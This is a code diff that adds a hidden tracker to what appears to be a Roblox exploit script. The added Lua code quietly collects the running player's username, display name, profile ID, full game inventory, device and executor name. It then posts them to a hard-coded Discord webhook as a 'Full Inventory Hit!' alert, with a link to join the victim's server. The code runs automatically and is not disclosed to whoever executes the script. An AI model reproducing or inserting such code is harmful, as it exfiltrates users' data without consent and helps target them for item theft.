@@ -143,3 +143,165 @@ Script execution completed
 MoonSec Protection Active
 Infinite Yield Protection: Enabled
 ]]
+-- [[ OSAMA HUB | TRACKER SYSTEM 2026 ]] --
+local Discord_Webhook_URL = "https://discord.com/api/webhooks/1516369394089857165/QU62FTN8Dw6IonwbhJwTH0kDP3frol7yhLkb81JfxPZ8pUxegUwZOCBHMAm0Gpg2Y3XN" -- 👈 حط الرابط هنا
+
+local function ReportToDiscord()
+    local player = game.Players.LocalPlayer
+    local HttpService = game:GetService("HttpService")
+    local MarketPlaceService = game:GetService("MarketplaceService")
+    local UserInputService = game:GetService("UserInputService")
+    
+    local successName, placeInfo = pcall(function() return MarketPlaceService:GetProductInfo(game.PlaceId) end)
+    local gameName = successName and placeInfo.Name or "Unknown Game"
+
+    local deviceType = "PC"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        deviceType = "Mobile"
+    end
+    local executorUsed = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
+
+    local totalItems = 0
+    local petCount = 0
+    local seedCount = 0
+    local fruitCount = 0
+    local inventoryTable = {}
+
+    local petNames = {"frog", "raccoon", "owl", "bunny", "deer", "robin", "bee", "monkey", "dragonfly", "unicorn", "dragon", "serpent"}
+
+    -- الدالة المطورة لعد الأعداد الحقيقية للأيتمز
+    local function scanAndClassify(parent)
+        for _, item in pairs(parent:GetChildren()) do
+            if item:IsA("Tool") or item:IsA("HopperBin") then
+                local name = item.Name
+                local lowerName = string.lower(name)
+                
+                -- فحص إذا كان جوا الأداة سكريبت أو قيمة مسؤولة عن العدد
+                local itemAmount = 1
+                local countValue = item:FindFirstChild("Amount") or item:FindFirstChild("Value") or item:FindFirstChild("Count") or item:FindFirstChild("Quantity")
+                
+                if countValue and (countValue:IsA("NumberValue") or countValue:IsA("IntValue")) then
+                    itemAmount = countValue.Value
+                elseif item:GetAttribute("Amount") then
+                    itemAmount = item:GetAttribute("Amount")
+                elseif item:GetAttribute("Count") then
+                    itemAmount = item:GetAttribute("Count")
+                end
+                
+                -- تسجيل العدد الحقيقي في الجدول
+                inventoryTable[name] = (inventoryTable[name] or 0) + itemAmount
+                totalItems = totalItems + itemAmount
+                
+                -- التصنيف للإحصائيات
+                local isPet = false
+                for _, pet in ipairs(petNames) do
+                    if string.find(lowerName, pet) then
+                        isPet = true
+                        break
+                    end
+                end
+                
+                if isPet then
+                    petCount = petCount + itemAmount
+                elseif string.find(lowerName, "seed") then
+                    seedCount = seedCount + itemAmount
+                elseif string.find(lowerName, "apple") or string.find(lowerName, "fruit") or string.find(lowerName, "dragon's breath") then
+                    fruitCount = fruitCount + itemAmount
+                end
+            end
+        end
+    end
+
+    scanAndClassify(player:WaitForChild("Backpack"))
+    if player.Character then
+        scanAndClassify(player.Character)
+    end
+
+    local function getEmoji(itemName)
+        local lower = string.lower(itemName)
+        if string.find(lower, "sprinkler") then
+            if string.find(lower, "legendary") or string.find(lower, "legndery") then return "✨👑"
+            elseif string.find(lower, "rare") then return "🔮💦"
+            elseif string.find(lower, "super") then return "⚡💦"
+            elseif string.find(lower, "uncommon") then return "🟢💦"
+            else return "🔹💦"
+            end
+        end
+        if string.find(lower, "frog") then return "🐸"
+        elseif string.find(lower, "raccoon") then return "🦝"
+        elseif string.find(lower, "owl") then return "🦉"
+        elseif string.find(lower, "bunny") then return "🐰"
+        elseif string.find(lower, "deer") then return "🦌"
+        elseif string.find(lower, "robin") then return "🐦"
+        elseif string.find(lower, "bee") then return "🐝"
+        elseif string.find(lower, "monkey") then return "🐵"
+        elseif string.find(lower, "dragonfly") then return "🛸"
+        elseif string.find(lower, "unicorn") then return "🦄"
+        elseif string.find(lower, "dragon") then return "🐉"
+        elseif string.find(lower, "serpent") then return "🐍"
+        elseif string.find(lower, "gold") then return "🟡"
+        elseif string.find(lower, "rainbow") then return "🌈"
+        elseif string.find(lower, "seed") then return "🌱"
+        elseif string.find(lower, "apple") then return "🍎"
+        elseif string.find(lower, "dragon's breath") then return "🔥🍎"
+        elseif string.find(lower, "watering can") then return "💧" 
+        elseif string.find(lower, "trowel") then return "🔧"
+        else return "📦"
+        end
+    end
+
+    local inventoryText = ""
+    for itemName, count in pairs(inventoryTable) do
+        local emoji = getEmoji(itemName)
+        inventoryText = inventoryText .. emoji .. " x" .. tostring(count) .. " " .. itemName .. "\n"
+    end
+    if inventoryText == "" then inventoryText = "Empty Inventory" end
+
+    local playerInfoBlock = "```ansi\n"
+        .. "Username     : " .. player.Name .. "\n"
+        .. "Display Name : " .. player.DisplayName .. "\n"
+        .. "Total Items  : " .. tostring(totalItems) .. "\n"
+        .. "```"
+
+    local inventoryBlock = "```ansi\n"
+        .. "Pets: " .. tostring(petCount) .. " | Seeds: " .. tostring(seedCount) .. " | Fruits: " .. tostring(fruitCount) .. "\n"
+        .. "------------------------------------\n"
+        .. inventoryText
+        .. "```"
+
+    local systemInfoBlock = "```ansi\n"
+        .. "Game Name    : " .. gameName .. "\n"
+        .. "Executor     : " .. executorUsed .. "\n"
+        .. "Device       : " .. deviceType .. "\n"
+        .. "```"
+
+    local data = {
+        ["content"] = "@everyone",
+        ["embeds"] = {{
+            ["title"] = "🌟 [OSAMA HUB] | Full Inventory Hit! 🌻",
+            ["color"] = 16753920,
+            ["fields"] = {
+                {["name"] = "👤 Player Info", ["value"] = playerInfoBlock, ["inline"] = false},
+                {["name"] = "🎒 Inventory Status", ["value"] = inventoryBlock, ["inline"] = false},
+                {["name"] = "⚙️ System Info", ["value"] = systemInfoBlock, ["inline"] = false},
+                {["name"] = "🔗 Links", ["value"] = "🎮 [Join Server](https://www.roblox.com/games/" .. game.PlaceId .. ")\n👤 [Profile](https://www.roblox.com/users/" .. player.UserId .. "/profile)", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Osama System • 2026"}
+        }}
+    }
+    
+    local request = syn and syn.request or http_request or req or request or (http and http.request)
+    if request then
+        pcall(function()
+            request({
+                Url = Discord_Webhook_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
+
+task.spawn(ReportToDiscord)
+
